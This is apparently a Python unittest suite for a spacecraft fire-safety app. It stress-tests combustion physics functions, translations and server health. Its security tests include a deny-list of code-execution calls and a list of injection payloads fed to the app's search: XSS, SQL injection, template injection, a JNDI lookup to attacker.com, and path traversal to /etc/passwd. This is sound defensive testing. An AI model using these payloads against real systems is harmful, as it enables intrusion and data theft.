#!/usr/bin/env python3
"""
Adversarial Stress-Test Suite for NASA Spacecraft Fire Safety App
Empirical Challenger: challenger_2
Target Files: app.py, i18n.py

Validates:
1. Physics formulas under boundary & degenerate conditions (g=0, 1e-6, 1.0, 5.0; O2=0, 100%; flow=0; extreme temps; NaN/Inf)
2. Security vulnerabilities (input sanitization, safe file path resolution, absence of eval/exec)
3. Runtime stability (memory leak check, exception immunity, i18n key parity, HTTP health)
"""

import ast
import io
import logging
import math
import os
import sys
import time
import tracemalloc
import unittest
import warnings
import urllib.request
import urllib.error

# Suppress noisy logs during test run
logging.getLogger("streamlit").setLevel(logging.ERROR)
warnings.filterwarnings("ignore")

# Ensure repository root is on sys.path
REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

import i18n
import app
from app import MicrogravityCombustionPhysics


class PhysicsEngineStressTest(unittest.TestCase):
    """Area 1: Stress-test physics formulas under boundary and degenerate conditions."""

    @classmethod
    def setUpClass(cls):
        psi_data = app.load_nasa_psi_data()
        cls.materials = psi_data["materials_df"].to_dict(orient="records")
        cls.pmma = next(m for m in cls.materials if m["material_id"] == "MAT-01")
        cls.cotton = next(m for m in cls.materials if m["material_id"] == "MAT-02")
        cls.nomex = next(m for m in cls.materials if m["material_id"] == "MAT-03")
        cls.teflon = next(m for m in cls.materials if m["material_id"] == "MAT-06")

    def test_gravity_boundaries(self):
        """Stress-test gravity across degenerate, orbital, terrestrial, hypergravity boundaries."""
        gravities = [0.0, 1e-6, 1e-4, 0.08, 0.16, 0.38, 0.80, 1.0, 5.0, 10.0, 100.0]
        for g in gravities:
            for mat in self.materials:
                # 1. Effective MOC
                eff_moc = MicrogravityCombustionPhysics.calculate_effective_moc(mat, g, 10.0, 101.3)
                self.assertTrue(math.isfinite(eff_moc), f"eff_moc not finite for g={g}, mat={mat['material_id']}")
                self.assertGreaterEqual(eff_moc, 8.0)
                self.assertLessEqual(eff_moc, 60.0)

                # 2. Flame spread rate
                spread = MicrogravityCombustionPhysics.calculate_flame_spread_rate(mat, g, 25.0, 101.3, 10.0, eff_moc)
                self.assertTrue(math.isfinite(spread), f"spread not finite for g={g}, mat={mat['material_id']}")
                self.assertGreaterEqual(spread, 0.0)

                # 3. SFRS score
                score, label, color = MicrogravityCombustionPhysics.calculate_space_fire_risk_score(
                    mat, eff_moc, spread, 25.0, 101.3, 10.0
                )
                self.assertTrue(math.isfinite(score), f"sfrs not finite for g={g}")
                self.assertIn(label, ["Safe", "Moderate", "High", "Critical"])

                # 4. Morphology metrics
                morph = MicrogravityCombustionPhysics.calculate_flame_morphology_metrics(
                    gravity_g=g, airflow_cm_s=10.0, oxygen_pct=21.0, pressure_kpa=101.3
                )
                self.assertTrue(math.isfinite(morph["aspect_ratio"]))
                self.assertTrue(math.isfinite(morph["peak_temp_k"]))
                self.assertTrue(math.isfinite(morph["reynolds"]))
                self.assertTrue(math.isfinite(morph["grashof"]))
                self.assertTrue(math.isfinite(morph["richardson"]))
                self.assertTrue(math.isfinite(morph["damkohler"]))

    def test_oxygen_boundaries(self):
        """Stress-test oxygen concentration from 0.0% to 100.0%."""
        o2_levels = [0.0, 0.5, 10.0, 15.0, 21.0, 34.0, 50.0, 85.0, 100.0]
        for o2 in o2_levels:
            for mat in [self.pmma, self.nomex]:
                eff_moc = MicrogravityCombustionPhysics.calculate_effective_moc(mat, 0.0, 10.0, 101.3)
                spread = MicrogravityCombustionPhysics.calculate_flame_spread_rate(
                    mat, 0.0, o2, 101.3, 10.0, eff_moc
                )
                self.assertTrue(math.isfinite(spread))
                if o2 < eff_moc:
                    self.assertEqual(spread, 0.0, f"Spread should be 0.0 when O2 ({o2}) < MOC ({eff_moc})")
                else:
                    self.assertGreaterEqual(spread, 0.0)

                score, label, _ = MicrogravityCombustionPhysics.calculate_space_fire_risk_score(
                    mat, eff_moc, spread, o2, 101.3, 10.0
                )
                self.assertTrue(math.isfinite(score))
                if o2 < eff_moc:
                    self.assertEqual(score, 0.0)
                    self.assertEqual(label, "Safe")

    def test_airflow_stagnant_and_extreme(self):
        """Stress-test ventilation airflow from 0.0 cm/s up to 200.0 cm/s."""
        flows = [0.0, 1e-5, 0.5, 2.0, 5.0, 10.0, 25.0, 50.0, 100.0, 200.0]
        for flow in flows:
            eff_moc = MicrogravityCombustionPhysics.calculate_effective_moc(self.pmma, 0.0, flow, 101.3)
            self.assertTrue(math.isfinite(eff_moc))
            # At stagnant 0 cm/s, quenching delta must be elevated
            if flow < 3.5:
                self.assertGreater(eff_moc, float(self.pmma["moc_microg"]))

            spread = MicrogravityCombustionPhysics.calculate_flame_spread_rate(
                self.pmma, 0.0, 30.0, 101.3, flow, eff_moc
            )
            self.assertTrue(math.isfinite(spread))

            # Morphology metrics with flow = 0.0
            morph = MicrogravityCombustionPhysics.calculate_flame_morphology_metrics(
                gravity_g=0.0, airflow_cm_s=flow, oxygen_pct=21.0
            )
            self.assertFalse(math.isnan(morph["reynolds"]))
            self.assertFalse(math.isnan(morph["richardson"]))
            self.assertFalse(math.isnan(morph["damkohler"]))
            self.assertGreater(morph["reynolds"], 0.0)  # Safe clamping ensures > 0

    def test_temperature_mesh_and_3d_figure(self):
        """Stress-test temperature field calculation and 3D figure generation."""
        temp_levels = [300.0, 600.0, 1380.0, 1850.0, 3000.0, 5000.0]
        gravities = [0.0, 0.16, 1.0, 5.0]

        for temp in temp_levels:
            for g in gravities:
                # Active flame mesh
                x, y, T, scale = app.calculate_temperature_mesh(g, 10.0, temp, is_extinguished=False)
                self.assertEqual(len(x), 60)
                self.assertEqual(len(y), 60)
                self.assertEqual(T.shape, (60, 60))
                self.assertFalse(math.isnan(T.min()))
                self.assertFalse(math.isnan(T.max()))
                self.assertGreaterEqual(T.min(), 290.0)

                # Extinguished mesh
                x_e, y_e, T_e, _ = app.calculate_temperature_mesh(g, 10.0, temp, is_extinguished=True)
                self.assertEqual(T_e.min(), 300.0)
                self.assertEqual(T_e.max(), 300.0)

        # 3D Figure generation for all regimes
        fig_0g = app.generate_3d_flame_figure(0.0, 10.0, 1380.0, is_extinguished=False)
        self.assertIsNotNone(fig_0g)
        self.assertGreater(len(fig_0g.data), 0)

        fig_lunar = app.generate_3d_flame_figure(0.16, 10.0, 1600.0, is_extinguished=False)
        self.assertIsNotNone(fig_lunar)
        self.assertGreater(len(fig_lunar.data), 0)

        fig_1g = app.generate_3d_flame_figure(1.0, 10.0, 1850.0, is_extinguished=False)
        self.assertIsNotNone(fig_1g)
        self.assertGreater(len(fig_1g.data), 0)

        fig_ext = app.generate_3d_flame_figure(0.0, 0.0, 300.0, is_extinguished=True)
        self.assertIsNotNone(fig_ext)
        self.assertGreater(len(fig_ext.data), 0)

    def test_nan_and_inf_immunity(self):
        """Stress-test immunity to Inf inputs and extreme bounds."""
        inf = float("inf")

        # Effective MOC with infinite gravity
        moc_inf = MicrogravityCombustionPhysics.calculate_effective_moc(self.pmma, inf, 10.0, 101.3)
        self.assertTrue(math.isfinite(moc_inf))
        self.assertEqual(moc_inf, 60.0)  # Clipped to upper bound

        # Morphology metrics with negative gravity resilience
        morph_neg = MicrogravityCombustionPhysics.calculate_flame_morphology_metrics(
            gravity_g=-1.0, airflow_cm_s=-5.0, oxygen_pct=21.0
        )
        self.assertTrue(math.isfinite(morph_neg["reynolds"]))
        self.assertTrue(math.isfinite(morph_neg["grashof"]))
        self.assertTrue(math.isfinite(morph_neg["richardson"]))

        # Extinction curve with zero / negative pressure check
        v_sw, moc_sw = MicrogravityCombustionPhysics.generate_extinction_curve(self.pmma, 0.0, 50.0)
        self.assertEqual(len(v_sw), 60)
        self.assertTrue(all(math.isfinite(val) for val in moc_sw))

    def test_negative_gravity_edge_case_vulnerability(self):
        """
        DEFENSE VERIFICATION:
        Negative gravity is safely clamped to degenerate floor 0.0g via max(0.0, float(gravity_g)).
        No RuntimeWarning, no NaN.
        """
        moc_neg = MicrogravityCombustionPhysics.calculate_effective_moc(self.pmma, -0.1, 10.0, 101.3)
        self.assertTrue(math.isfinite(moc_neg), "Negative gravity should be safely clamped to 0g degenerate floor")
        self.assertEqual(moc_neg, MicrogravityCombustionPhysics.calculate_effective_moc(self.pmma, 0.0, 10.0, 101.3))

    def test_cool_flames_boundary(self):
        """Stress-test cool flames anomaly detection boundary logic."""
        # Susceptible material (PMMA) inside window: g<=0.08, v<=4, p>=35, O2 near MOC
        moc = MicrogravityCombustionPhysics.calculate_effective_moc(self.pmma, 0.0, 2.0, 101.3)
        active, msg = MicrogravityCombustionPhysics.detect_cool_flames(
            self.pmma, gravity_g=0.0, airflow_cm_s=2.0, oxygen_pct=moc, pressure_kpa=101.3
        )
        self.assertTrue(active)
        self.assertIn("Cool Flame", msg)

        # Non-susceptible material (Nomex) must never trigger cool flames
        active_nomex, _ = MicrogravityCombustionPhysics.detect_cool_flames(
            self.nomex, gravity_g=0.0, airflow_cm_s=2.0, oxygen_pct=moc, pressure_kpa=101.3
        )
        self.assertFalse(active_nomex)

        # High gravity (1.0g) must never trigger cool flames
        active_1g, _ = MicrogravityCombustionPhysics.detect_cool_flames(
            self.pmma, gravity_g=1.0, airflow_cm_s=2.0, oxygen_pct=moc, pressure_kpa=101.3
        )
        self.assertFalse(active_1g)

    def test_cached_sweeps(self):
        """Stress-test cached paradox and boundary sweep functions."""
        # Convert dict to tuple for cache key
        mat_tuple = tuple(sorted(self.pmma.items()))
        v_rng, sp_0g, sp_1g, sp_cg = app.calculate_cached_paradox_sweep(mat_tuple, 30.0, 101.3, 0.16)
        self.assertEqual(len(v_rng), 35)
        self.assertEqual(len(sp_0g), 35)
        self.assertEqual(len(sp_1g), 35)
        self.assertEqual(len(sp_cg), 35)
        self.assertTrue(all(math.isfinite(x) for x in sp_0g))
        self.assertTrue(all(math.isfinite(x) for x in sp_1g))
        self.assertTrue(all(math.isfinite(x) for x in sp_cg))


class SecurityVulnerabilityStressTest(unittest.TestCase):
    """Area 2: Test security vulnerabilities: input sanitization, safe file paths, eval/exec absence."""

    def test_absence_of_arbitrary_code_execution_ast(self):
        """Static AST scan verifying absence of eval, exec, os.system, subprocess, pickle in app.py & i18n.py."""
        target_files = [
            os.path.join(REPO_ROOT, "app.py"),
            os.path.join(REPO_ROOT, "i18n.py")
        ]

        prohibited_builtins = {"eval", "exec", "compile", "__import__"}
        prohibited_attrs = {"system", "popen", "spawn", "fork"}
        prohibited_modules = {"pickle", "subprocess", "shlex", "pty"}

        for filepath in target_files:
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            tree = ast.parse(content, filename=filepath)

            for node in ast.walk(tree):
                # Check function calls
                if isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name) and node.func.id in prohibited_builtins:
                        self.fail(f"Prohibited builtin '{node.func.id}' found in {filepath} at line {node.lineno}")
                    elif isinstance(node.func, ast.Attribute) and node.func.attr in prohibited_attrs:
                        self.fail(f"Prohibited attribute call '{node.func.attr}' in {filepath} at line {node.lineno}")

                # Check imports
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        if alias.name in prohibited_modules:
                            self.fail(f"Prohibited module import '{alias.name}' in {filepath} at line {node.lineno}")
                elif isinstance(node, ast.ImportFrom):
                    if node.module in prohibited_modules:
                        self.fail(f"Prohibited from-import '{node.module}' in {filepath} at line {node.lineno}")

    def test_safe_file_path_resolution(self):
        """Ensure load_nasa_psi_data only loads legitimate datasets and handles missing paths safely."""
        psi = app.load_nasa_psi_data()
        self.assertIn("materials_df", psi)
        self.assertIn("sofie_df", psi)
        self.assertIn("saffire_df", psi)
        self.assertIn("bass_df", psi)
        self.assertEqual(len(psi["materials_df"]), 10, "Embedded flight materials must contain all 10 NASA specimens")
        self.assertIsNotNone(psi["sofie_df"])
        self.assertIsNotNone(psi["saffire_df"])
        self.assertIsNotNone(psi["bass_df"])

    def test_rag_query_sanitization_and_adversarial_prompts(self):
        """Verify vector DB and RAG query processing remain resilient under malicious injection payloads."""
        vdb = app.get_nasa_vector_db()
        self.assertIsNotNone(vdb)

        malicious_payloads = [
            "<script>alert('XSS')</script>",
            "\"><svg onload=alert(1)>",
            "'; DROP TABLE materials; --",
            "{{7*7}}",
            "${jndi:ldap://attacker.com/a}",
            "../../../../../../etc/passwd",
            "\x00\x00\x00",
            "A" * 10000,  # Buffer overflow attempt
            "SELECT * FROM * WHERE 1=1",
            "{{config.items()}}",
            "__import__('os').system('dir')",
        ]

        for payload in malicious_payloads:
            # 1. Vector search must not crash
            results = vdb.search(payload, top_k=3)
            self.assertIsInstance(results, list)

            # 2. Answer synthesis must not evaluate or crash
            ans_en = vdb.synthesize_answer(payload, results, lang="en")
            self.assertIsInstance(ans_en, str)
            self.assertGreater(len(ans_en), 0)

            ans_vi = vdb.synthesize_answer(payload, results, lang="vi")
            self.assertIsInstance(ans_vi, str)
            self.assertGreater(len(ans_vi), 0)

    def test_online_llm_resilience_and_timeout(self):
        """Verify query_online_llm_rag handles network failures, timeouts, and fake keys gracefully."""
        # Test with invalid dummy API keys without crashing
        res_gemini = app.query_online_llm_rag(
            "What is PMMA flammability?", "Evidence text", "Google Gemini", "invalid-dummy-key-12345", lang="en"
        )
        self.assertIsInstance(res_gemini, str)
        self.assertTrue(len(res_gemini) > 0)

        res_openai = app.query_online_llm_rag(
            "What is PMMA flammability?", "Evidence text", "OpenAI", "sk-dummy-key-12345", lang="vi"
        )
        self.assertIsInstance(res_openai, str)
        self.assertTrue(len(res_openai) > 0)


class RuntimeStabilityStressTest(unittest.TestCase):
    """Area 3: Validate runtime stability: memory leak profile, i18n contract, live HTTP robustness."""

    def test_memory_leak_and_allocation_stability(self):
        """Execute 2,000 rapid iterations of physics calculations to check memory stability."""
        psi = app.load_nasa_psi_data()
        pmma = psi["materials_df"].iloc[0].to_dict()

        tracemalloc.start()
        snapshot_start = tracemalloc.take_snapshot()

        for i in range(2000):
            g = (i % 20) / 10.0
            flow = (i % 50)
            o2 = 15.0 + (i % 30)
            p = 50.0 + (i % 60)
            eff_moc = MicrogravityCombustionPhysics.calculate_effective_moc(pmma, g, flow, p)
            spread = MicrogravityCombustionPhysics.calculate_flame_spread_rate(pmma, g, o2, p, flow, eff_moc)
            _ = MicrogravityCombustionPhysics.calculate_space_fire_risk_score(pmma, eff_moc, spread, o2, p, flow)
            _ = MicrogravityCombustionPhysics.calculate_flame_morphology_metrics(g, flow, o2, p)

        snapshot_end = tracemalloc.take_snapshot()
        tracemalloc.stop()

        top_stats = snapshot_end.compare_to(snapshot_start, 'lineno')
        total_growth_kb = sum(stat.size_diff for stat in top_stats) / 1024.0

        # Memory growth across 2000 iterations must be negligible (< 2.5 MB)
        self.assertLess(total_growth_kb, 2500.0, f"Excessive memory growth detected: {total_growth_kb:.2f} KB")

    def test_i18n_translation_contract(self):
        """Verify translation dictionary parity and fallback robustness."""
        trans_vi = i18n.TRANSLATIONS.get("vi", {})
        trans_en = i18n.TRANSLATIONS.get("en", {})

        self.assertGreater(len(trans_vi), 0)
        self.assertGreater(len(trans_en), 0)

        # Check key parity
        missing_in_en = set(trans_vi.keys()) - set(trans_en.keys())
        missing_in_vi = set(trans_en.keys()) - set(trans_vi.keys())

        self.assertEqual(len(missing_in_en), 0, f"Keys in 'vi' missing from 'en': {missing_in_en}")
        self.assertEqual(len(missing_in_vi), 0, f"Keys in 'en' missing from 'vi': {missing_in_vi}")

        # Check suppression database for all 10 materials
        for i in range(1, 11):
            mat_id = f"MAT-{i:02d}"
            self.assertIn(mat_id, i18n.BILINGUAL_SUPPRESSION_DATABASE)
            mat_data = i18n.BILINGUAL_SUPPRESSION_DATABASE[mat_id]
            for lang in ["vi", "en"]:
                self.assertIn(lang, mat_data)
                proto = mat_data[lang]
                for key in ["action_1", "optimal_agent", "secondary_hazard", "decontamination"]:
                    self.assertIn(key, proto)
                    self.assertTrue(len(proto[key]) > 0)

        # Check invalid language code fallback
        fallback = i18n.get_i18n("unknown_lang_xyz")
        self.assertEqual(fallback, trans_vi)

        proto_fallback = i18n.get_protocol("MAT-01", lang="fr")
        self.assertIn("action_1", proto_fallback)

    def test_live_streamlit_server_http_health(self):
        """Verify live Streamlit daemon responds to health check and home page with HTTP 200."""
        health_url = "http://localhost:8501/_stcore/health"
        home_url = "http://localhost:8501/"

        try:
            req_health = urllib.request.Request(health_url)
            with urllib.request.urlopen(req_health, timeout=5) as response:
                status = response.getcode()
                body = response.read().decode("utf-8").strip()
                self.assertEqual(status, 200)
                self.assertEqual(body, "ok")
        except urllib.error.URLError as e:
            self.fail(f"Streamlit server health check failed: {e}")

        try:
            req_home = urllib.request.Request(home_url)
            with urllib.request.urlopen(req_home, timeout=5) as response:
                status = response.getcode()
                body = response.read().decode("utf-8")
                self.assertEqual(status, 200)
                self.assertIn("<!DOCTYPE html>", body)
        except urllib.error.URLError as e:
            self.fail(f"Streamlit server home page fetch failed: {e}")


if __name__ == "__main__":
    unittest.main(verbosity=2)
